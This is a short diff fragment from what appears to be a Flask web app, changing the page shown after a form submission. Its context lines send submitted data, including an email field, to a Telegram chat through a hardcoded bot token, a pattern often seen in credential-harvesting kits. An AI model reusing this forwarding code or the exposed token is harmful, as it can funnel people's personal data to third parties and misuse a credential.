@@ -67,7 +67,7 @@ Email: %s
         requests.post(url)   
         url = "https://api.telegram.org/bot527562365:AAFDyCml1bgH7D5mvng6KcxKI-dTvAN6Ybc/sendMessage?chat_id=27390261&text=%s" % (text)
         requests.post(url) 
-    return render_template('index.html')
+    return render_template('ok.html')
     # conn = mysql.connect()
     # cursor = conn.cursor()
     # try:
